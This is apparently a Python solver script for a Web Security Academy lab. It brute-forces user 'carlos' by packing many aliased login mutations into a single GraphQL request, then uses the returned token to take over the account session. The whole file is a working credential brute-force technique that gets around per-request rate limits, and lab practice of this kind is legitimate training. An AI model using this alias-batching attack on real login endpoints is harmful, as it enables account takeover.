from web_security_academy.core.utils import auth_lab_passwords
from web_security_academy.core.logger import logger
import json


def solve_lab(session):
    passwords = auth_lab_passwords()

    # _123456: login(input { username "carlos", password "123456" }) {
    #     token
    #     success
    # }
    aliases = ", ".join(
        [
            f"_{password}"
            + ': login(input: { username: "carlos", password: "'
            + password
            + '" }) { token success }'
            for password in passwords
        ]
    )

    logger.info("Sending brute force GraphQL query to find carlos's password...")
    query = {"query": "mutation { " + aliases + "}"}
    resp = session.post_path("/graphql/v1", json=query)
    resp = json.loads(resp.text)

    for password in passwords:
        data = resp["data"][f"_{password}"]
        if data and data["success"]:
            break
    else:
        logger.failure("Unable to find carlos's password")
        return

    session.cookies.clear_session_cookies()
    session.cookies.set("session", data["token"])
    session.get_path("/my-account")
    logger.info(f'Logged in with username "carlos" and password "{password}"')
